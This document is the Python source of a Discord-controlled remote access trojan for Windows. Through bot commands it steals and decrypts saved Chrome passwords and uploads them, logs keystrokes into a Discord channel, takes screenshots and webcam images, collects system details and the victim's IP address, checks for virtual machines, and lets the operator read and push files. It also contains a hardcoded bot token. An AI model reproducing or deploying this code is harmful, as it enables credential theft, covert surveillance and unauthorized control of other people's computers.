import os
import subprocess
import requests
import discord
from discord.ext import commands
from discord.voice_client import VoiceClient
from discord import opus
import pyautogui
import platform
import psutil
import time
import asyncio
import cv2
import keyboard
import string
import pyaudio

directory_path = "C:/Users/Public"
home_path = os.getcwd()
user_home_dir = os.path.expanduser("~")
running = False
output = ""


def delete_file(path, file_name):
    file_path = os.path.join(path, file_name)
    try:
        os.remove(file_path)
        print(f"File {file_name} deleted successfully.")
    except OSError as e:
        print(f"An error occurred while deleting the file: {e}")


def change_directory(new_path):
    try:
        os.chdir(new_path)
        print("Current path:", os.getcwd())
    except OSError:
        print("Error")


def get_current_ip_address():
    response = requests.get("https://api.ipify.org/?format=json")
    data = response.json()
    return data["ip"]


def add_line_index(file_path, file_name):
    full_path = os.path.join(file_path, file_name)
    with open(full_path, "r") as file:
        lines = file.readlines()

    indexed_lines = [f"{index + 1}. {line}" for index,
                     line in enumerate(lines)]

    modified_content = "\n".join(indexed_lines)

    new_file_name = file_name
    new_file_path = os.path.join(file_path, new_file_name)
    with open(new_file_path, "w") as file:
        file.write(modified_content)

    print(f"Modified content saved to {new_file_path}")


def create_text_file(file_name):
    file_path = os.path.join(directory_path, file_name)
    file_content = "This is the content of the file."

    with open(file_path, "w") as file:
        file.write(file_content)

    print(f'File "{file_name}" created successfully at "{directory_path}".')


def stop_printing():
    global running
    running = False


def decrypter():
    import os
    import re
    import sys
    import json
    import base64
    import sqlite3
    import win32crypt
    from Cryptodome.Cipher import AES
    import shutil
    import csv

    # GLOBAL CONSTANT
    CHROME_PATH_LOCAL_STATE = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            # (1) Get secretkey from chrome local state
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(
                local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(
                secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print(
                "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    if __name__ == '__main__':
        try:
            # Create Dataframe to store passwords
            with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index", "url", "username", "password"])
                # (1) Get secret key
                secret_key = get_secret_key()
                # Search user profile or default folder (this is where the encrypted login password is stored)
                folders = [element for element in os.listdir(
                    CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
                for folder in folders:
                    # (2) Get ciphertext from sqlite database
                    chrome_path_login_db = os.path.normpath(
                        r"%s\%s\Login Data" % (CHROME_PATH, folder))
                    conn = get_db_connection(chrome_path_login_db)
                    if (secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT action_url, username_value, password_value FROM logins")
                        for index, login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if (url != "" and username != "" and ciphertext != ""):
                                # (3) Filter the initialisation vector & encrypted password from ciphertext
                                # (4) Use AES algorithm to decrypt the password
                                decrypted_password = decrypt_password(
                                    ciphertext, secret_key)

                                # (5) Save into CSV
                                csv_writer.writerow(
                                    [index, url, username, decrypted_password])
                        # Close database connection
                        cursor.close()
                        conn.close()
                        # Delete temp login db
                        os.remove("Loginvault.db")
        except Exception as e:
            print("[ERR] %s" % str(e))


intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    change_directory(user_home_dir)
    print("I am online")

    # Get the desired text channel by its ID (replace CHANNEL_ID with the actual channel ID)
    main_channel = bot.get_channel(1123381125847457943)

    # Send a message to the channel indicating that the bot is online
    target_user_id=384454372295180290
    target_user = bot.get_user(target_user_id)
    if target_user:
        await main_channel.send(f"{target_user.mention} Bot is now online!")


@bot.command()
async def test(ctx):
    # Command logic goes here
    await ctx.send("This is a test command!")


@bot.command()
async def cd(ctx, *, new_path):
    await ctx.send(f"cd command {new_path}")
    change_directory(new_path)
    await ctx.send(f"cd command {new_path}")
    if new_path == "..":
        change_directory(user_home_dir)


@bot.command()
async def download(ctx, *, file_path):
    try:
        await ctx.send(file=discord.File(file_path))
    except:
        await ctx.send("error")
    await ctx.send("download command")


@bot.command()
async def ls(ctx):
    current_path = os.getcwd()

    files = os.listdir(current_path)

    # Create a formatted string with the file names
    file_list = '\n'.join(files)

    # Write the file list to a temporary file with UTF-8 encoding
    with open('file_list.txt', 'w', encoding='utf-8') as file:
        file.write(file_list)

    # Send the file as an attachment
    await ctx.send('Files in the current directory:', file=discord.File('file_list.txt'))

    # Delete the temporary file
    os.remove('file_list.txt')


@bot.command()
async def create(ctx, file_name):
    await ctx.send(f"create command {file_name}")


@bot.command()
async def pwd(ctx):
    current_path = os.getcwd()
    await ctx.send(f"Current Directory: {current_path}")


@bot.command()
async def delete_files(ctx):
    delete_file(user_home_dir, "file_list.txt")
    await ctx.send("Deleted All Created Files")


@bot.command()
async def shutdown(ctx):
    await ctx.send("Shutting down...")
    await bot.close()


@bot.command()
async def grab(ctx):
    decrypter()
    await ctx.send(file=discord.File("decrypted_password.csv"))
    time.sleep(5)
    delete_file(home_path, "decrypted_password.csv")


@bot.command()
async def ss(ctx):
    # Capture screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

    # Send screenshot as an embedded image
    embed = discord.Embed(
    title='Screenshot', description='Current screen', color=discord.Color.blue())
    file = discord.File('screenshot.png', filename='screenshot.png')
    embed.set_image(url='attachment://screenshot.png')
    await ctx.send(embed=embed, file=file)

@bot.command()
async def sysinfo(ctx):

    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    ip_address = get_current_ip_address()
    mem = psutil.virtual_memory()
    total_memory = mem.total

    info = f"Client IP address: {ip_address}\n" \
           f"Computer Name: {os.environ['COMPUTERNAME']}\n" \
           f"Username: {os.getlogin()}\n" \
           f"System: {system}\n" \
           f"Release: {release}\n" \
           f"Version: {version}\n" \
           f"Machine: {machine}\n" \
           f"Processor: {processor}\n" \
           f"Total Memory: {total_memory / (1024 ** 3):.2f} GB\n"
    try:
        system = platform.system()
        is_vm = False

        if system == 'Linux':
            with open('/proc/1/status', 'r') as file:
                for line in file:
                    if line.startswith('envID'):
                        is_vm = True
                        break
        elif system == 'Windows':
            with open('C:/Windows/System32/hal.dll', 'rb') as file:
                data = file.read()
                if b'QEMU' in data or b'VMware' in data:
                    is_vm = True

        if is_vm:
            info = f"The system is running on a virtual machine.\n\n" \
                f"Client IP address: {ip_address}\n" \
                f"Computer Name: {os.environ['COMPUTERNAME']}\n" \
                f"Username: {os.getlogin()}\n" \
                f"System: {system}\n" \
                f"Release: {release}\n" \
                f"Version: {version}\n" \
                f"Machine: {machine}\n" \
                f"Processor: {processor}\n" \
                f"Total Memory: {total_memory / (1024 ** 3):.2f} GB\n"
        else:
            info = f"The system is running on a physical machine.\n\n" \
                f"Client IP address: {ip_address}\n" \
                f"Computer Name: {os.environ['COMPUTERNAME']}\n" \
                f"Username: {os.getlogin()}\n" \
                f"System: {system}\n" \
                f"Release: {release}\n" \
                f"Version: {version}\n" \
                f"Machine: {machine}\n" \
                f"Processor: {processor}\n" \
                f"Total Memory: {total_memory / (1024 ** 3):.2f} GB\n"
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

    await ctx.send(f"```{info}```")


@bot.command()
async def sysspecs(ctx):
   # Get CPU information
    cpu_model = platform.processor()

    # Get graphics card information
    gpu_info = []
    try:
        import subprocess
        if platform.system() == 'Windows':
            command = 'wmic path win32_VideoController get name'
        elif platform.system() == 'Linux':
            command = 'lspci -k | grep -A 2 -i "VGA"'
        else:
            command = None

        if command:
            result = subprocess.check_output(command, shell=True)
            gpu_info = result.decode().strip().split('\n')[1:]
    except Exception:
        pass

    if not gpu_info:
        gpu_info.append("N/A")

    # Get memory information
    mem = psutil.virtual_memory()
    total_memory = mem.total // (1024 ** 3)  # Convert to GB

    # Get storage information
    disks = psutil.disk_partitions(all=True)
    hdd_info = []
    ssd_info = []
    for disk in disks:
        if 'cdrom' not in disk.opts:
            if 'fixed' in disk.opts:
                ssd_info.append(disk.device)
            else:
                hdd_info.append(disk.device)

    info = f"CPU: {cpu_model}\n" \
           f"Graphics Card: {''.join(gpu_info)}\n" \
           f"RAM: {total_memory} GB\n" \
           f"HDD: {', '.join(hdd_info)}\n" \
           f"SSD: {', '.join(ssd_info)}"

    await ctx.send(f"```{info}```")


@bot.command()
async def drive(ctx, action, *args):
    if action == 'list':
        disks = psutil.disk_partitions(all=True)
        Disk_info = []
        for disk in disks:
            if 'cdrom' not in disk.opts:
                Disk_info.append(disk.device)
        info = f"Disks: {', '.join(Disk_info)}"
        await ctx.send(f"```{info}```")
    elif action == 'cd':
        if len(args) == 1:
            drive_name = args[0]
            try:
                # Change the current directory to the specified drive
                os.chdir(drive_name)
                await ctx.send(f"Changed directory to {drive_name}")
            except FileNotFoundError:
                await ctx.send(f"Drive {drive_name} not found.")
            except Exception as e:
                await ctx.send(f"An error occurred: {str(e)}")
        else:
            await ctx.send("Invalid command. Usage: `!drive cd [drive_name]`")
    else:
        await ctx.send("Invalid action. Use '!drive list' to list available drives or '!drive cd [drive_name]' to change the directory.")


@bot.command()
async def capture(ctx):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite('captured_image.png', frame)
    cap.release()

    # Send image as an embedded message
    embed = discord.Embed(title='Webcam Capture')
    file = discord.File('captured_image.png', filename='image.png')
    embed.set_image(url='attachment://image.png')
    await ctx.send(file=file, embed=embed)


@bot.command()
async def upload(ctx):
    attachments = ctx.message.attachments
    for attachment in attachments:
        await attachment.save(attachment.filename)
        await ctx.send(f"File '{attachment.filename}' saved!")
target_channel_id=716477461247819816

@bot.command()
async def join(ctx):
    channel = bot.get_channel(target_channel_id)
    if channel:
        try:
            voice_client = await channel.connect()
            await ctx.send(f"Joined voice channel: {channel.name}")

            def after(error):
                if error:
                    print(f"Error in voice client: {error}")
                asyncio.run_coroutine_threadsafe(voice_client.disconnect(), bot.loop)

            def start_stream():
                def read_audio():
                    while True:
                        voice_data = voice_client.receiver._connection._get_voice_data()
                        if voice_data is not None:
                            pcm_data = voice_data[0].data
                            if pcm_data:
                                yield pcm_data

                voice_client.play(
                    discord.PCMVolumeTransformer(
                        discord.FFmpegPCMAudio(source=read_audio())
                    ),
                    after=after,
                )

            start_stream()

        except discord.ClientException:
            await ctx.send("I'm already in a voice channel.")
    else:
        await ctx.send("The target voice channel ID is invalid.")

@bot.command()
async def log(ctx, action,channel_name=None):
    global running
    
    if action == 'on':
        if not channel_name:
            await ctx.send("Please provide a channel name.")
            return
        running = True
        
        guild = ctx.guild
        existing_channel = discord.utils.get(guild.channels, name=channel_name)
        
        if existing_channel:
            channel = existing_channel
            await ctx.send(f"A channel with the name '{channel_name}' already exists.")
        else:
            channel = await guild.create_text_channel(channel_name)
            await ctx.send(f"A new channel '{channel_name}' has been created.")
        await print_pressed_key(channel)

    elif action == 'off':
        
        running = False
        await ctx.send("Logging has been turned off.")

    elif action == 'delete' and channel_name :
        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
        if channel:
            await channel.delete()
            channel = None
            await ctx.send("Logging channel has been deleted.")
        else:
            await ctx.send("No logging channel exists.")


async def print_pressed_key(channel):
    output = ""
    while running:
        event = keyboard.read_event()
        if event.event_type == "down":
            if event.name == "enter":
                await channel.send(output+" [enter] ")
                output = ""
            elif event.name not in string.ascii_letters:
                output += " [{}] ".format(event.name)
            else:
                output += event.name
    
bot.run("NDY0ODg2Mjc4MzAzOTA3ODUw.GwMvF4.Mb68lLRE4z1H-yzErF48MwcpGKF4XCmQBk-7TQ")
